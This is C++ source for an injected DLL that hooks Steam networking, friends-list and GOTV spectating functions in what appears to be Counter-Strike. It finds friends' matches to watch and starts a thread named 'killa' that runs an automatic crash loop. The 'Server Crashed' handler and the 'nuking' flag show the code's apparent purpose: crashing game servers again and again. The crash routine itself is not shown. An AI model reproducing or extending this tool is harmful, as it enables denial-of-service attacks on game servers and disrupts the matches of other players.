	void* connect_to_hosted_dedicated_server_ptr = FindPattern("steamnetworkingsockets.dll", "55 8B EC 6A FF 68 ? ? ? ? 64 A1 ? ? ? ? 50 64 89 25 ? ? ? ? 81 EC ? ? ? ? 56 57 68 ? ? ? ? 8B F1 E8 ? ? ? ? 83 C4 04 80 BE ? ? ? ? ?");


	MH_CreateHook(valves_register_getasynckeystatecall, &hk_RegisterGetAsyncKeyStateCall, &dont_care_ptr);
	MH_CreateHook(send_datagram_address, &hk_send_datagram, &orginal_send_datagram);
	MH_CreateHook(&GetAsyncKeyState, hk_GetAsyncKeyState, (void**)&oGetAsyncKeyState);
	MH_CreateHook(request_watchinfo_friends_ptr, &RequestWatchInfoFriendsFromGC, (void**)&oRequestWatchInfo);
	MH_CreateHook(loop_ptr, &LoopThroughTillProtoIsFound, (void**)&oLoopForWatchableMatch);
	MH_CreateHook(gotv_ptr, &SomeGoTV, (void**)&oGoTVThing);
	MH_CreateHook(connect_to_hosted_dedicated_server_ptr, &hk_ConnectToHostedDedicatedServer, (void**)&oConnectToDedicatedServer);

	ISteamFriends* pIgnore = 0;
	hooks->steamFriends.init(g_pFriends);
	hooks->steamFriends.hookAt(3, hk_GetFriendCount);
	hooks->steamFriends.hookAt(4, hk_GetFriendByIndex);
	hooks->steamFriends.hookAt(5, hk_GetFriendRelationship);
	hooks->steamFriends.hookAt(6, hk_GetFriendPersonaState);
	hooks->steamFriends.hookAt(8, hk_GetFriendGamePlayed);
	hooks->steamFriends.hookAt(43, SetRichPresence);


	//hooks->steamNetworkingSockets.init(g_pSteamNetworkingSockets);
	//hooks->steamNetworkingSockets.hookAt(30, hk_ConnectToHostedDedicatedServer);
	
	//g_pSteamNetworkingSockets->ConnectToHostedDedicatedServer


	//hooks->steamFriends.hookAt(49, hk_InviteUserToGame);

	MH_EnableHook(MH_ALL_HOOKS);

	static std::thread killa(_AutoCrashLoop);

}



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		AllocConsole();
		FILE* fDummy;
		freopen_s(&fDummy, "CONOUT$", "w", stdout);
		freopen_s(&fDummy, "CONOUT$", "w", stderr);
		freopen_s(&fDummy, "CONIN$", "r", stdin);
		initialize_hooks();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}











void AutoWatcher::RequestWatch(CSteamID csID)
{
	typedef void* (__cdecl* GetGlobalWatchInfoFriendsFunc_t)();
	static GetGlobalWatchInfoFriendsFunc_t s_GetGlobalProtoWatch =
		(GetGlobalWatchInfoFriendsFunc_t)FindPattern(
			"client",
			"0F 57 C0 C7 05 ? ? ? ? ? ? ? ? C7 05 ? ? ? ? ? ? ? ? B8 ? ? ? ? C7 05 ? ? ? ? 00 00 00 00 C7 05 ? ? ? ? 00 00 00 00 C7 05 ? ? ? ? 00 00 00 00 C7 05 ? ? ? ? FF FF 00 00 C7 05 ? ? ? ? FF FF FF FF"
		);

	static void* (__thiscall * ConnectToWatchGC)(void*) = (void* (__thiscall*)(void*))FindPattern("client", "55 8B EC 83 E4 F8 81 EC ? ? ? ? 80 3D ? ? ? ? 00 53 56 57 8B F9");
	static void* (__cdecl * RunCallFunc_t)() = (void* (__cdecl*)())FindPattern("client", "55 8B EC 83 E4 F8 51 8B 15 ? ? ? ? 33 C9 8B C2 0B 05 ? ? ? ? 56");
	static uint64_t* pSteamId = *(uint64_t**)((char*)RunCallFunc_t + 9);

	static void* pWatch = s_GetGlobalProtoWatch();
	uint32_t nId = csID.GetAccountID();
	void* pRet = (*(void* (__thiscall**)(void*, uint32_t*))(*(char**)pWatch + 8))(pWatch, &nId);
	//pRet = oRequestWatchInfo(pWatch, nullptr, csID.GetAccountID(), 0, 0);
	//*pSteamId = csID.ConvertToUint64();
	//RunCallFunc_t();
	char buffer[1024] = { 0 };
	_ui64toa(csID.ConvertToUint64(), buffer, 10);
	try {
		SomeGoTV(buffer);
	}
	catch (std::exception& e)
	{
		__debugbreak();
	}
#if 0
	if (pRet)
	{
		auto v2 = *(char**)((char*)pRet + 24);
		if (*((DWORD*)v2 + 5) >= 16u)
			v2 = *(char**)v2;

		printf(" :: %s\n", v2);

		ConnectToWatchGC(pRet);



		

	}
	else
		printf("Unable To Get Watch Proto!\n");
#endif
	//
}


void AutoWatcher::OnConnectionProblem()
{
	g_pVoice->Speak(L"Server Crashed, Connection Problem Detected", SVSFlagsAsync, NULL);
	Beep(1000, 500);
	m_hCurrConnection = 0;
	m_bIsConnected = false;
	m_bIsNuking = false;
}